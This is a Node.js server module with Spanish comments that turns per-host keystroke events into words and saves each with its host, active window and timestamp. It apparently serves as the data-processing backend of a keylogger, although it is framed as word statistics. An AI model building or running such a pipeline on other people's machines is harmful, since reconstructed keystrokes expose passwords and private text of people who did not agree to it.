// Reconstruye palabras a partir de pulsaciones individuales.
// Mantiene un buffer en memoria por host; cuando una palabra se "cierra"
// (espacio, enter, cambio de ventana, etc.) se guarda en la coleccion Word.

const Word = require('./models/Word');

// Teclas especiales que SOLO cierran la palabra actual (no modifican el buffer).
const CLOSERS = new Set([
  '[ENTER]', '[TAB]', '[ESCAPE]',
  '[LEFT]', '[RIGHT]', '[UP]', '[DOWN]',
  '[HOME]', '[END]', '[PG_UP]', '[PG_DOWN]'
]);

// Modificadores: se ignoran sin cerrar la palabra.
const MODIFIERS = new Set([
  '[SHIFT]', '[LSHIFT]', '[RSHIFT]',
  '[CONTROL]', '[LCONTROL]', '[RCONTROL]',
  '[ALT]', '[LWIN]', '[RWIN]', '[CAPSLOCK]'
]);

// Longitud minima y maxima aceptada para contar una palabra.
const MIN_LEN = 2;
const MAX_LEN = 50;

// Un buffer por host (y recordamos la ventana en la que se escribio).
const buffers = new Map();

function getBuf(host) {
  let b = buffers.get(host);
  if (!b) {
    b = { text: '', window: '', startedAt: null };
    buffers.set(host, b);
  }
  return b;
}

async function flush(host) {
  const b = buffers.get(host);
  if (!b || b.text.length === 0) return;

  const word = b.text.toLowerCase();
  const window = b.window;
  const startedAt = b.startedAt || new Date();

  // Limpiar buffer antes del await por si llegan mas teclas en paralelo.
  b.text = '';
  b.startedAt = null;

  if (word.length < MIN_LEN || word.length > MAX_LEN) return;

  // Filtrar "palabras" que son solo digitos o solo signos para no inflar stats.
  // (dejamos pasar las mixtas: p.ej. "casa1" si).
  if (!/[a-zñáéíóúü]/i.test(word)) return;

  try {
    await Word.create({
      host,
      window,
      word,
      length: word.length,
      timestamp: startedAt
    });
  } catch (err) {
    // No tiramos el servidor por una palabra que no se pudo guardar.
    console.error('Word.create fallo:', err.message);
  }
}

// Procesa una pulsacion ya guardada. host y key son obligatorios.
// window puede cambiar entre pulsaciones; si cambia, cerramos la palabra.
async function handleKey({ host, window, key, timestamp }) {
  const b = getBuf(host);

  // Cambio de ventana → cierra palabra en curso.
  if (b.text.length > 0 && window !== b.window) {
    await flush(host);
  }
  b.window = window || '';

  if (!key) return;

  // Modificadores: no hacen nada al buffer.
  if (MODIFIERS.has(key)) return;

  // Backspace: borra ultimo caracter del buffer.
  if (key === '[BACKSPACE]') {
    if (b.text.length > 0) b.text = b.text.slice(0, -1);
    return;
  }

  // Teclas de navegacion / escape: cierran la palabra.
  if (CLOSERS.has(key)) {
    await flush(host);
    return;
  }

  // Espacio: cierra la palabra.
  if (key === ' ') {
    await flush(host);
    return;
  }

  // Un unico caracter: lo acumulamos.
  if (key.length === 1) {
    // Separadores de palabra tipicos.
    if (/[\s.,;:!?()\[\]{}"'`\/\\|<>@#$%^&*=+~]/.test(key)) {
      await flush(host);
      return;
    }
    if (b.text.length === 0) b.startedAt = timestamp ? new Date(timestamp) : new Date();
    b.text += key;
    // Proteccion por si algo nunca cierra.
    if (b.text.length > MAX_LEN) {
      await flush(host);
    }
    return;
  }

  // Cualquier otra tecla especial no listada: cerramos por si acaso.
  await flush(host);
}

// Vacia todos los buffers (uso en shutdown o /api/stats/flush).
async function flushAll() {
  const hosts = Array.from(buffers.keys());
  await Promise.all(hosts.map(h => flush(h)));
}

module.exports = { handleKey, flush, flushAll };
